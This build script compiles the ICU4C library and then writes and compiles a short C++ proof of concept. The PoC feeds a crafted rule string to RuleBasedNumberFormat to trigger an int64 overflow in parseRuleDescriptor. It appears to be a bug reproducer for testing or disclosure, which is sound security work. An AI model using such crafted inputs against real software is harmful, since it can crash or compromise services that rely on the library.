#!/bin/bash -eu
./icu4c/source/runConfigureICU Linux --prefix="$PWD/install" --enable-shared --enable-static --enable-debug
make -j32
make install

cat <<EOF > poc.cpp
#include "unicode/locid.h"
#include "unicode/utypes.h"
#include "unicode/parseerr.h"
#include "unicode/rbnf.h"
#include <iostream>
#include <cstdlib>

using namespace icu;


int main() {
    UParseError perror;
    UErrorCode status = U_ZERO_ERROR;
    // Test int64 overflow inside parseRuleDescriptor
    UnicodeString testStr(u"0110110/300113001103000113001103000110i/3013033:");
    RuleBasedNumberFormat rbfmt(
        testStr,
        Locale("as"), perror, status);
    if (U_FAILURE(status)) {
        std::cout << "Should return failure" << std::endl;
    }

    return 0;
}
EOF

if [ ! -z "${CXX:-}" ]; then
    ${CXX} ${CXXFLAGS} -I install/include -L install/lib -l icuuc -l icui18n -l icudata -Wl,-rpath,install/lib -o poc poc.cpp
fi